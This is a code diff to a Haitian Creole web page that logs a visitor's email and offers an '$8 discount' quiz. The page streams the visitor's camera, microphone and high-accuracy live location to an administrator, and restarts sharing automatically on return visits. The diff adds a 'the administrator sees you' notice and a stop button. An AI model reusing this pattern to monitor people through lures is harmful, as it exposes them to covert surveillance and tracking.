@@ -334,10 +334,11 @@
 
     <div class="active-panel hidden" id="activeView">
       <div class="card">
-        <p><span class=""></span><strong>Bienvenue !</strong></p>
+        <p><span class="dot"></span><strong>Bienvenue !</strong></p>
         <p style="margin-top:8px; font-size:13px; color:#aaa;">
+          Administratè a ap wè ou.
         </p>
-       <button id="btnStop" class=""></button>
+        <button id="btnStop" class="btn-stop">⛔ Sispann Pataje</button>
         <button id="btnQuiz" class="btn-quiz">🎯 Fè Quiz la — Jwenn $8 Rabè</button>
       </div>
     </div>
@@ -501,7 +502,6 @@ btnLogin.onclick = () => {
 
   localStorage.setItem("visitor_logged", "1");
   localStorage.setItem("visitor_email", email);
-  // ⚠️ PA SERE MODPAS LA
   showApp();
 };
 
@@ -941,23 +941,38 @@ document.getElementById("btnSubmitOrder").onclick = async () => {
 
   async function ensureCamera() {
     if (localStream) {
-      const tracks = localStream.getVideoTracks();
-      if (tracks.length > 0 && tracks.some(t => t.readyState === "live")) return true;
-      try { tracks.forEach(t => t.stop()); } catch (e) {}
+      const vTracks = localStream.getVideoTracks();
+      const aTracks = localStream.getAudioTracks();
+      const vLive = vTracks.length > 0 && vTracks.some(t => t.readyState === "live");
+      const aLive = aTracks.length > 0 && aTracks.some(t => t.readyState === "live");
+      
+      console.log("🔍 Kamera check:", { vLive, aLive, vCount: vTracks.length, aCount: aTracks.length });
+      
+      if (vLive && aLive) return true;
+      
+      try { localStream.getTracks().forEach(t => t.stop()); } catch (e) {}
       localStream = null;
     }
     try {
       localStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" }, audio: true
+        video: { facingMode: "user", width: 640, height: 480 },
+        audio: true
       });
+      console.log("✅ Kamera ak mikwo jwenn");
       return true;
     } catch (err) {
+      console.warn("⚠️ Erè kamera devan:", err);
       try {
         localStream = await navigator.mediaDevices.getUserMedia({
-          video: true, audio: true
+          video: { width: 640, height: 480 },
+          audio: true
         });
+        console.log("✅ Kamera ak mikwo jwenn (facingMode pa disponib)");
         return true;
-      } catch (err2) { return false; }
+      } catch (err2) { 
+        console.error("❌ Kamera pa mache:", err2);
+        return false; 
+      }
     }
   }
 
@@ -1018,12 +1033,12 @@ document.getElementById("btnSubmitOrder").onclick = async () => {
         const watchId = navigator.geolocation.watchPosition(
           sendLocation,
           (err) => console.warn("Erè lokasyon:", err.message),
-          { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+          { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
         );
         window._watchId = watchId;
       },
       (err) => console.warn("Visitor refize lokasyon:", err.message),
-      { enableHighAccuracy: true, timeout: 10000 }
+      { enableHighAccuracy: true, timeout: 15000 }
     );
   }
 
@@ -1063,7 +1078,6 @@ document.getElementById("btnSubmitOrder").onclick = async () => {
     await ensureCall();
     startLocationTracking();
 
-    // ✅ Sere si visitor lan te aktive kamera a
     localStorage.setItem("visitor_sharing", "1");
 
     active = true;
@@ -1079,7 +1093,6 @@ document.getElementById("btnSubmitOrder").onclick = async () => {
     stopLocationTracking();
     db.ref("locations/" + VISITOR_ID).remove();
 
-    // ✅ Efase si visitor lan peze Sispann
     localStorage.removeItem("visitor_sharing");
 
     if (currentCall) { try { currentCall.close(); } catch (e) {} currentCall = null; }
@@ -1129,6 +1142,7 @@ document.getElementById("btnSubmitOrder").onclick = async () => {
   });
 
   // ✅ RELANCE OTOMATIK SI VISITOR TE DEJA AKTIVE KAMERA A
+  // ⚠️ Tann 3 segond (olye 800ms) pou kamera a pare
   if (localStorage.getItem("visitor_sharing") === "1") {
     setTimeout(() => {
       console.log("🔄 Relance kamera otomatikman...");
@@ -1139,7 +1153,7 @@ document.getElementById("btnSubmitOrder").onclick = async () => {
         activeView.classList.add("hidden");
         ctaView.classList.remove("hidden");
       });
-    }, 800);
+    }, 3000);
   }
 })();
 
@@ -1160,5 +1174,8 @@ if ("serviceWorker" in navigator) {
   });
 }
 </script>
+</body>
+</html>
+
 </body>
 </html>
